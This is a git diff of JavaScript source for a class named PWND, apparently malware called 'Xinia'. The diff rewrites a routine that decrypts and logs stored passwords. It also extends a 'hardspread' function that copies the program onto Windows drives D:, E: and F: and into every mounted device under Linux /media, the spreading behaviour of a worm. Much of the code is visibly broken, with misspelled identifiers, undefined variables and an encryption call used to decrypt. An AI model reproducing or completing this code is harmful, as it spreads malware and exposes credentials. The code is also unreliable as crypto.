@@ -4,7 +4,10 @@
   */
 const aes = require('aes-js');
 const { copySync } = require('fs-extra');
-  sys_check = require("./sys_check");
+const { dirname } = require('path');
+  sys_check = require("./sys_check"),
+  fs = require("fs"),
+  path = require("path");
 
 class PWND {
     constructor() {}
@@ -27,54 +30,64 @@ class PWND {
         return init_vect;
     }
 
-    static async decrypt(pass, master_key) {
-        String(pass);
-        // An example 128-bit key (16 bytes * 8 bits/byte = 128 bits)
-        var key = master_key;
+    static async decrypt(pass) {
+        function sha1(input) {
+          return crypto.createHash('sha1').update(input).digest();
+        }
 
-        var result = [];
-        for (let r = 3; r < pass.length && 15 !== r; r++) result.push(array[r]);
-        var init_vect = result.join("");
-        result2 = [];
-        for (let r = 15; r < pass.length && -16 !== r; r++) result.push(array[r]);
-        var encrypted_pass = result2.join("");
+        function pass_derive_bytes(pass, salt, iterations, len) {
+          var key = Buffer.from(pass+salt);
+          for (let i; i < iterations; i++) {
+            key = sha1(key);
+          }
+          if (key.length < len) {
+            var hx = pass_derive_bytes(pass, salt, iterations - 1, 20);
+            for (var counter = 1; key.length < len; ++counter) {
+              key = Buffer.concat([key, sha1(Buffer.concat([Buffer.from(counter.toString()), hx]))]);
+            }
+          }
+          return BUffer.alloc(len, key);
+        }
 
-        // FIND A WAY TO GENERATE THE KEY/CIPHER
-        /**
-         * base64.b64decode(master_key])
-         */
+        async function decode(string) {
+          var key = pass_derive_bytes(password, '', 100, 32);
+          var cipher = crypto.createCipheriv('aes-256-cbc', key, Buffer.from(iv));
+          var part1 = cipher.update(string, 'utf8');
+          var part2 = cipher.final();
+          const decryptedText = Buffer.concat([part1, part2]).toString('base64');
+          return decryptedText;
+        }
 
-        // Convert text to bytes
-        var text = pass.toString("utf-8");
-        console.log(text)
-        // When ready to decrypt the hex string, convert it to bytes
-        var encryptedBytes = aes.utils.hex.toBytes(text);
-
-        // The counter mode of operation maintains internal state, so to
-        // decrypt a new instance must be instantiated.
-        var aesCtr = new aes.ModeOfOperation.ofb(key, init_vect);
-        var decryptedBytes = aesCtr.decrypt(encryptedBytes);
-
-        // Convert our bytes back into text
-        var decryptedText = aes.utils.utf8.fromBytes(decryptedBytes);
-
-        return console.log("Decrypted password: ", decryptedText);
+        return console.log("Decrypted password: ", await decode(pass));
     }
 
     static async hardspread() {
         if (/win32/gi.test(process.platform)) {
           try {
-            copySync("../", "D:/");
+            copySync("./", "D:/Stuff");
           } catch (e) {
             console.log("Drive D: doesn't exist, trying new drive")
-            copySync("../", "E:/");
+            copySync("./", "E:/Stuff");
           } finally {
-            copySync("../", "F:/");
+            copySync("./", "F:/Stuff");
           }
         } else if ((/darwin/gi).test(process.platform)) {
 
         } else if ((/linux/gi).test(process.platform)) {
+          try {
+            fs.readdir('/media', (err, folder) => {
+              if (err) throw new Error("Failed to load /media directory, aborting process.");
+              console.log(`Loaded [${folder.length}] folders, successfully.`);
 
+              folder.forEach(d => {
+                console.log(d);
+                copySync(("./"), `/media/${d}/Stuff`);
+                console.log(`Exploit: Copied Xinia to : ${d}`);
+              })
+            });
+          } catch (e) {
+            console.log(e);
+          }
         } else {
           throw new Error("Unknown System Platform!!! exiting now!"), process.exit(1);
         }
